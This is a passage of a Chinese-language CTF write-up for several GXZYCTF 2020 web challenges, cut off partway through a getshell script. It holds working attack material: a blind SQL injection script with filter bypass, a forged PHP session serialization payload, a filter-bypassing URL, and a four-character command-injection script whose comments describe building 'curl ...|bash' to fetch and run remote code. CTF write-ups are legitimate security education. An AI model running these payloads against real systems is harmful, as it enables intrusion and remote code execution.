class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#vip.py</span></span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        global vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span><span class="symbol">:</span></span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.truevipcode</span><br></pre></td></tr></table></figure>

<p>由于fl4g被过滤了，所以只能另辟蹊径，代码中</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">global</span> <span class="string">current_folder_file</span></span><br><span class="line"><span class="attr">try</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">os.listdir(self.path)</span></span><br><span class="line"><span class="attr">except</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">current_folder_file</span></span><br></pre></td></tr></table></figure>

<p>所以可以通过current_folder_file来获取flag文件夹，构造</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;vipfile.<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">current_folder_file</span>][<span class="symbol">21</span>]&#125;/flag</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0.png" alt>            </p>
<h3 id="0x02-nweb"><a href="#0x02-nweb" class="headerlink" title="0x02 nweb"></a>0x02 nweb</h3><p>根据登入后的提示，用户会有分级，注册账号的时候隐藏了type属性</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583722768764.png" alt>            </p>
<p>type赋值为110，登录后可以访问flag.php 里面是一个search框，可以测试一下注入</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583722779047.png" alt="img">            </p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583722789446.png" alt="img">            </p>
<p>简单测试发现只过滤了select和from，可以双写绕过，所以写一个脚本跑就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag= <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">Cookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'huiulsnkb5bpm59h6v38o1qlv1;'</span>,</span><br><span class="line">          <span class="string">'username'</span>:<span class="string">'41fcba09f2bdcdf315ba4119dc7978dd'</span>&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">        <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        <span class="comment">#payload=r"1' or 1=(ascii(mid(CONCAT_WS(CHAR(32,58,32),user(),database(),version()),&#123;&#125;,1))&gt;&#123;&#125;)--+" #65</span></span><br><span class="line">        <span class="comment">#payload=r"1' or 1=(ascii(mid((selselectect group_concat(column_NAME) frfromom information_schema.columnS where table_name='admin'),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">        payload=<span class="string">r"1' or 1=(ascii(mid((selselectect pwd frfromom admin limit 1),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">        <span class="comment">#payload=r"1' or 1=(ascii(mid((database()),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">        url_1=url+payload.format(i,mid)</span><br><span class="line">        data=&#123;<span class="string">"flag"</span>:payload.format(i,mid)&#125;</span><br><span class="line">        r=requests.post(url,data=data,cookies=Cookie,proxies=proxies)</span><br><span class="line">        print(r.content)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"is flag"</span> <span class="keyword">in</span>  r.content:</span><br><span class="line">            low=mid+<span class="number">1</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">    print(flag)</span><br><span class="line">    flag+=chr(mid)</span><br></pre></td></tr></table></figure>

<p>数据库里只有一半的flag：flag{Rogue-MySql-Server- ，同时还得到了admin用户的密码：whoamiadmin</p>
<p>根据前半段flag和登录后的提示，也就是伪造mysql服务任意文件读取的问题了，通过Rogue-MySql-Server脚本设置读取一下flag.php文件</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583751402598.png" alt>            </p>
<p>也就拿到了flag的后一部分，拼接起来就可以了。</p>
<h3 id="0x03-php-uaf"><a href="#0x03-php-uaf" class="headerlink" title="0x03 php uaf"></a>0x03 php uaf</h3><p>送分题，访问直接得源代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">@mkdir($sandbox);</span></span><br><span class="line"><span class="php">@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span></span><br><span class="line"><span class="php">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br></pre></td></tr></table></figure>

<p>看一下phpinfo，php版本是7.4.2，设置了disable_function和open_basedir</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309110411132.png" alt="image-20200309110411132"></p>
<p>直接拿<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> php7.4版本通杀的exp通道菜刀传上去直接执行/readflag就行了</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583723134043.png" alt>            </p>
<h3 id="0x04-dooog"><a href="#0x04-dooog" class="headerlink" title="0x04 dooog"></a>0x04 dooog</h3><p>题目很简单，逻辑捋清楚就行了，从client出发，先后向kdc的getTGT和getTicket发包校验，校验通过则发包到cmd执行，执行没有回显，主要在getTicket中的判断限制了cmd的内容，不过认真分析一下kdc源码，可以发现data变量是可控的，控制前一数据包中的timestamp使得int(time.time()) - data[‘timestamp’] &gt; 60就可以了，所以修改client app.py</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, flash</span><br><span class="line">from flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line">from form <span class="keyword">import</span> RegisterForm, CmdForm</span><br><span class="line">from toolkit <span class="keyword">import</span> AESCipher</span><br><span class="line"><span class="keyword">import</span> os, requests, json, time, base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">"SECRET_KEY"</span>] = os.urandom(<span class="number">32</span>)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/cmd'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def cmd():</span><br><span class="line">    form = CmdForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            cmd = form.cmd.<span class="keyword">data</span></span><br><span class="line">            print(username,master_key,cmd)</span><br><span class="line">            cryptor = AESCipher(master_key)</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>:username, <span class="string">'timestamp'</span>: int(time.time())&#125;))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTGT'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'authenticator'</span>: base64.b64encode(authenticator)&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            session[<span class="string">'session_key'</span>], session[<span class="string">'TGT'</span>] = cryptor.decrypt(base64.b64decode(res.content.split(<span class="string">'|'</span>)[<span class="number">0</span>])), res.content.split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">            flash(<span class="string">'GET TGT DONE'</span>)</span><br><span class="line">            #visit TGS</span><br><span class="line">            cryptor = AESCipher(session[<span class="string">'session_key'</span>])</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>: username, <span class="string">'timestamp'</span>: <span class="number">1</span>&#125;))</span><br><span class="line"></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTicket'</span>,  <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'cmd'</span>: cmd, <span class="string">'authenticator'</span>: base64.b64encode(authenticator), <span class="string">'TGT'</span>: session[<span class="string">'TGT'</span>]&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'cmd error'</span>:</span><br><span class="line">                flash(<span class="string">'cmd not allow'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            flash(<span class="string">'GET Ticket DONE'</span>)</span><br><span class="line">            client_message, server_message = res.content.split(<span class="string">'|'</span>)</span><br><span class="line">            session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">            cryptor = AESCipher(session_key)</span><br><span class="line">            authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5002/cmd'</span>, <span class="keyword">data</span>=&#123;<span class="string">'server_message'</span>: server_message, <span class="string">'authenticator'</span>: authenticator&#125;)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>, flag=res.content)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/register'</span>, methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def register():</span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/register'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'master_key'</span>: master_key&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'duplicate username'</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">            elif res.content != <span class="string">''</span> :</span><br><span class="line">                session[<span class="string">'id'</span>] = int(res.content)</span><br><span class="line">                flash(<span class="string">'register success'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=False, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>本地起一个服务来发包就行了</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583723326867.png" alt>            </p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583723345340.png" alt>            </p>
<h3 id="0x05-sqlcheckin"><a href="#0x05-sqlcheckin" class="headerlink" title="0x05 sqlcheckin"></a>0x05 sqlcheckin</h3><p>这道题原题，就不写了，转<a href="https://gksec.com/HNCTF2019-Final.html#toc-sqlsql" target="_blank" rel="noopener">https://gksec.com/HNCTF2019-Final.html#toc-sqlsql</a></p>
<h3 id="0x06-Hackme"><a href="#0x06-Hackme" class="headerlink" title="0x06 Hackme"></a>0x06 Hackme</h3><p>访问<a href="http://www.zip得到题目源码，主要在于profile.php" target="_blank" rel="noopener">www.zip得到题目源码，主要在于profile.php</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">session_save_path(<span class="string">'session'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $admin;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $sign;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="php">            redirect(<span class="string">'./core/index.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> info();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>构造一下序列化</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $admin;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $sign;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;admin = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sign = <span class="string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="php">            redirect(<span class="string">'./core/index.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> info();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>输出：<code>O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:0:&quot;&quot;;}</code>修改为<code>|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:0:&quot;&quot;;}</code>发送后范围profile进入到/core/index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结起来就是4字节执行命令，不过首先得绕过一下preg_match，构造</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">url</span>=compress.zlib://data:@<span class="number">127.0</span>.<span class="number">0.1</span>/plain<span class="comment">;base64,xxxx</span></span><br></pre></td></tr></table></figure>

<p>来绕过判断，之后参考<a href="https://blog.csdn.net/qq_27446553/article/details/78502337" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/78502337</a> 四字符getshell构造脚本</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"># @Author: Cyc1e</span><br><span class="line"># @Date:   <span class="number">2020</span><span class="number">-03</span><span class="number">-09</span> <span class="number">13</span>:<span class="number">53</span>:<span class="number">34</span></span><br><span class="line"># @Last Modified by:   Cyc1e</span><br><span class="line"># @Last Modified time: <span class="number">2020</span><span class="number">-03</span><span class="number">-09</span> <span class="number">14</span>:<span class="number">18</span>:<span class="number">18</span></span><br><span class="line">#encoding=utf<span class="number">-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload = [</span><br><span class="line">    # 将 <span class="string">"g&gt; ht- sl"</span> 写到文件 <span class="string">"v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    # 将文件<span class="string">"v"</span>中的字符串倒序，放到文件<span class="string">"x"</span>，就变成了 <span class="string">"ls -th &gt;g"</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    # generate `curl orange.tw.tw|python`</span><br><span class="line">    # generate `curl <span class="number">10.188</span><span class="number">.2</span><span class="number">.20</span>|bash`</span><br><span class="line">    <span class="string">'&gt;p\ '</span>,</span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line">    <span 